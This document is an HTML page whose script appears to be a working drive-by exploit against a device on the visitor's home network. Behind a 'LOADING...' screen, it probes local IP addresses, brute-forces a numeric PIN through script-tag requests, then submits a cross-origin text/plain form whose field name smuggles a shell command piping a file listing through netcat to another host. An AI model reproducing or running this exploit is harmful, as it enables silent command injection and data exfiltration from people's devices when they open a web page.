<!DOCTYPE html>
<html>
<body>
LOADING...

<script>
  let searching = true

  function attack(ip, x) {
    var form = document.createElement("form");
    var friendly = document.createElement("input");

    form.method = "POST";
    form.action = "//" + ip + "/friendly_name?code="+x;
    form.setAttribute("enctype", "text/plain")
    friendly.name="\"; ls f* |nc 192.168.1.19 4\"";
    form.appendChild(friendly);

    document.body.appendChild(form);

    form.submit();
  }

  function gotPin(ip, x) {
    document.body.innerHTML="";
    attack(ip, x)
    searching = false;
  }

  function findPIN(host) {
    let start = 0;
    let delta = 1000
    setInterval(function(){
      for (let i = start; searching && i < start+delta; i++) {
        let s = document.createElement("script")
        s.onload = (x) => { searching = false; gotPin(host, x.target.src.split("=")[1]) }
        s.src="//" + host + "/version?code="+i;
        document.body.children=[]
        document.body.appendChild(s)
      }
      start += delta;
    }, 1000);

  }

  function findIP() {

    function check(ip)
    {
      let i = new Image()
      i.onload = (x) => {
        let a = document.createElement("a")
        a.href = x.target.src
        ret = a.host

        if (ret) {
          findPIN(ret)
        }
      }
      i.src="//" + ip + ":8080/sinot_aqua.webp"
    }

    //let ips = ["192.168.1.1", "192.168.1.19", "192.168.2.1", "192.168.10.10"]
    let ips = ["192.168.5.5", "192.168.10.10"]
    for (let ip of ips)
    {
      if (!searching) {
        break
      }
      console.log("check " + ip)
      check(ip)
    }
  }


  findIP()


</script>
</body>
</html>
